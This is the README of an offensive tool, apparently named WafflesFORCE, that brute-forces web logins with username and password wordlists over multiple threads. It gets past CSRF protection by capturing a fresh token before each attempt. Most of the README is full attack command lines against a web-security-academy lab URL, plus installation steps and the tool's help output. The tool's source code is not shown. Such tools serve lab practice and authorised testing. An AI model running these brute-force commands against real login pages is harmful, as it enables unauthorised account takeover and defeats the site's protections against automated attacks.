![image](https://github.com/user-attachments/assets/207902fe-2e60-497b-9a79-1ddcb460b7ca)
### -> Multi-threaded Login Bruteforcer for Bypassing CRSF Tokens Protection
This script is designed to brute force logins and bypass CSRF token protection. It achieves this by automatically capturing the CSRF token before each login attempt.

## Table of Contents
- [Features](#features)
- [Usage](#Usage)
  - [Examples](#examples)
- [Preivew](#Preview)
- [Installation](#installation)
- [Commands](#Commands)
- [Contact](#contact)


## Features
- **Automatic CSRF Token Handling**: Automatically captures and uses CSRF tokens during brute force attempts.
- **Multi-threading**: Utilizes multiple threads to increase the speed of brute force attempts.
- **Flexible Configuration**: Supports custom regex patterns and parameter names for CSRF tokens.
- **Status Code and Regex Matching**: Validates login attempts using customizable status codes and regex patterns.
- **To be implemented**: Filter out based on status code and regex.

**Note:** Always open for feature/improvement suggestions.

## Usage
To use this script, specify the following:
```
--csrf-regex : A regex pattern to capture the CSRF token.
--csrf-param : The name of the CSRF token parameter.
```
This additional configuration ensures the script accurately captures and uses CSRF tokens during brute force login attempts.
### Examples
```Python
# Basic Example
python3 wafflesforce.py --host "https://web-security-academy.net/login" --data 'username=*USER*&password=*PASS*' -U 'users.txt' -P 'passwords.txt' -mr '/login2' -ms '200-299,301,302' --csrf-param 'csrf' --csrf-regex 'name="csrf" value="(.*?)">' --threads 5 --output results.txt
# Using CSRF URL Example
python3 wafflesforce.py --host "https://web-security-academy.net/login" --data 'username=*USER*&password=*PASS*' -U 'users.txt' -P 'passwords.txt' -mr '/login2' -ms '200-299,301,302' --csrf-param 'csrf' --csrf-regex 'name="csrf" value="(.*?)">' --threads 5 --csrf-url "https://web-security-academy.net/login" --output results.txt
```

### Preview
![image](https://github.com/user-attachments/assets/6572f919-b586-405a-a365-ebeef00830a2)

## Installation
```bash
git clone https://github.com/WafflesExploits/WafflesFORCE.git
cd WafflesFORCE
python3 wafflesforce.py ...
```
## Commands 
```
╦ ╦╔═╗╔═╗╔═╗╦  ╔═╗╔═╗╔═╗╔═╗╦═╗╔═╗╔═╗
║║║╠═╣╠╣ ╠╣ ║  ║╣ ╚═╗╠╣ ║ ║╠╦╝║  ║╣ 
╚╩╝╩ ╩╚  ╚  ╩═╝╚═╝╚═╝╚  ╚═╝╩╚═╚═╝╚═╝
usage: wafflesforce.py [-h] [--host HOST] [-U [USERS]] [-u [USER]]
                       [-P [PASSWORDS]] [-p [PASSWORD]] [-cr CSRF_REGEX]
                       [-cp CSRF_PARAM] [-cu [CSRF_URL]] [-mr [MATCH_REGEX]]
                       [-ms [MATCH_STATUS]] [-d [DATA]] [-q [QUERY]]
                       [-t [THREADS]] [-o [OUTPUT]] [-vr] [--verbose]

-> Multi-threaded Login Bruteforcer for Bypassing CSRF Token Protection
 

options:
  -h, --help            show this help message and exit
  --host HOST           Target URL.
  -U [USERS], --users [USERS]
                        Path to usernames' wordlist file.
  -u [USER], --user [USER]
                        Specify a single username to use
  -P [PASSWORDS], --passwords [PASSWORDS]
                        Path to passwords' wordlist file.
  -p [PASSWORD], --password [PASSWORD]
                        Specify a single password to use
  -cr CSRF_REGEX, --csrf-regex CSRF_REGEX
                        Specify a Regex pattern to extract the CSRF token. Example:'name="csrf" value="(.*?)">'
  -cp CSRF_PARAM, --csrf-param CSRF_PARAM
                        Specify the CSRF token parameter name to be used in the login POST Request. Example:'csrf'
  -cu [CSRF_URL], --csrf-url [CSRF_URL]
                        URL path to fetch the CSRF token.
  -mr [MATCH_REGEX], --match-regex [MATCH_REGEX]
                        Match the specified regex pattern to verify login attempts. Example:'/login2'
  -ms [MATCH_STATUS], --match-status [MATCH_STATUS]
                        Match specified Status codes. Default:'200-299,301,302'
  -d [DATA], --data [DATA]
                        Body parameters for the POST request. Example:'username=*USER*&password=*PASS*'
  -q [QUERY], --query [QUERY]
                        Feature not added yet - Query parameters for the GET request
  -t [THREADS], --threads [THREADS]
                        Number of threads to use. Default: 5
  -o [OUTPUT], --output [OUTPUT]
                        Outputs results to a file.
  -vr, --verify         Set verify to false. Use this if the website does not support SSL. Example: Uses HTTP instead of HTTPS
  --verbose             Increase Verbosity. Use for debugging or giving more information about login attempts.

[Usage Example]
python3 wafflesforce.py --host "https://web-security-academy.net/login" --data 'username=*USER*&password=*PASS*' -U 'users.txt' -P 'passwords.txt' -mr '/login2' -ms '200-299,301,302' --csrf-param 'csrf' --csrf-regex 'name="csrf" value="(.*?)">' --threads 5 --output results.txt

[Using CSRF URL Example]
python3 wafflesforce.py --host "https://web-security-academy.net/login" --data 'username=*USER*&password=*PASS*' -U 'users.txt' -P 'passwords.txt' -mr '/login2' -ms '200-299,301,302' --csrf-param 'csrf' --csrf-regex 'name="csrf" value="(.*?)">' --threads 5 --csrf-url "https://web-security-academy.net/login" --output results.txt
```

## Contact
Created by [@WafflesExploits](https://wafflesexploits.github.io/about/) - I'm always open to features/improvement suggestions! You can reach me out on my socials :)
